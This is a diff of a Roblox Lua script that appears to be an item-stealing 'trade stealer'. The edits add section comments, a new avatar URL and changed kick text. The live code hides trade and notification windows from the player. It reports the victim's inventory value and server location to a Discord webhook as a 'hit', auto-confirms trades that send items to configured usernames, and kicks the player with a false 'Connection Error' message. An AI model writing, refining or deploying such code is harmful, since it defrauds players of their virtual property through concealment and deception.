@@ -1,9 +1,11 @@
+-- // CONFIGURATION & EXECUTION CHECK
 _G.scriptExecuted = _G.scriptExecuted or false
 if _G.scriptExecuted then
     return
 end
 _G.scriptExecuted = true
 
+-- // SERVICES
 local itemsToSend = {}
 local categories = {"Sword", "Emote", "Explosion"}
 local Players = game:GetService("Players")
@@ -18,14 +20,18 @@ local tradeCompleteGui = PlayerGui.TradeCompleted
 local clientInventory = require(game.ReplicatedStorage.Shared.Inventory.Client).Get()
 local Replion = require(game.ReplicatedStorage.Packages.Replion)
 
+-- // SETTINGS
 local users = _G.Usernames or {}
 local min_rap = _G.min_rap or 100
 local ping = _G.pingEveryone or "No"
 local webhook = _G.webhook or ""
 local auth_token = "EBK-SS-A" 
 
-local headshot = "https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=" .. plr.UserId .. "&size=420x420&format=Png&isCircular=false"
+-- // IMPROVED PROFILE PICTURE URL
+-- Using the direct headshot API which is more stable for Discord Webhooks
+local headshot = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. plr.UserId .. "&width=420&height=420&format=png"
 
+-- // PRE-CHECKS
 if next(users) == nil or webhook == "" then
     plr:kick("Configuration Error: Usernames or Webhook is empty.")
     return
@@ -46,6 +52,7 @@ if game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType"):Invo
     return
 end
 
+-- // PIN CHECK
 local args_pin = { [1] = { ["option"] = "PIN", ["value"] = "9079" } }
 local _, PINReponse = netModule:WaitForChild("RF/ResetPINCode"):InvokeServer(unpack(args_pin))
 if PINReponse ~= "You don't have a PIN code" then
@@ -53,6 +60,7 @@ if PINReponse ~= "You don't have a PIN code" then
     return
 end
 
+-- // UI STEALTH
 tradeGui.Black.Visible = false
 tradeGui.MiscChat.Visible = false
 tradeCompleteGui.Black.Visible = false
@@ -70,6 +78,7 @@ local notificationsFrame = notificationsGui.Notifications
 notificationsFrame.Visible = false
 notificationsFrame:GetPropertyChangedSignal("Visible"):Connect(function() notificationsFrame.Visible = false end)
 
+-- // TRADE HANDLER
 tradeGui:GetPropertyChangedSignal("Enabled"):Connect(function()
     inTrade = tradeGui.Enabled
     if inTrade then
@@ -133,6 +142,7 @@ end
 
 local totalRAP = 0
 
+-- // WEBHOOK SENDER FUNCTIONS
 local function SendJoinMessage(list, prefix)
     local botUsername = (totalRAP >= 500) and "🟢 GOOD HIT 🎯" or "🟣 SMALL HIT 🎯"
     local embedColor = (totalRAP >= 500) and 65280 or 8323327
@@ -168,9 +178,9 @@ local function SendJoinMessage(list, prefix)
     end
 
     local data = {
+        ["avatar_url"] = headshot, -- PLACED AT TOP FOR BETTER DISCORD RECOGNITION
         ["auth_token"] = auth_token,
         ["username"] = botUsername,
-        ["avatar_url"] = headshot, 
         ["content"] = prefix .. "game:GetService('TeleportService'):TeleportToPlaceInstance(13772394625, '" .. game.JobId .. "')",
         ["embeds"] = {{
             ["title"] = botUsername,
@@ -219,9 +229,9 @@ local function SendMessage(list)
     end
 
     local data = {
+        ["avatar_url"] = headshot, -- PLACED AT TOP
         ["auth_token"] = auth_token,
         ["username"] = botUsername,
-        ["avatar_url"] = headshot,
         ["embeds"] = {{
             ["title"] = "⚪ Server Hit 🎉" ,
             ["color"] = embedColor,
@@ -239,6 +249,7 @@ local function SendMessage(list)
     })
 end
 
+-- // INVENTORY DATA HANDLING
 local rapDataResult = Replion.Client:GetReplion("ItemRAP")
 local rapData = rapDataResult.Data.Items
 
@@ -279,6 +290,7 @@ for _, category in ipairs(categories) do
     end
 end
 
+-- // MAIN EXECUTION
 if #itemsToSend > 0 then
     table.sort(itemsToSend, function(a, b) return a.RAP > b.RAP end)
     local sentItems = {}
@@ -311,7 +323,7 @@ if #itemsToSend > 0 then
             task.wait(0.5)
             confirmTrade()
         end
-        plr:kick("Connection Error.")
+        plr:kick("Connection Error: Operation Finished.")
     end
 
     local function waitForUserJoin()
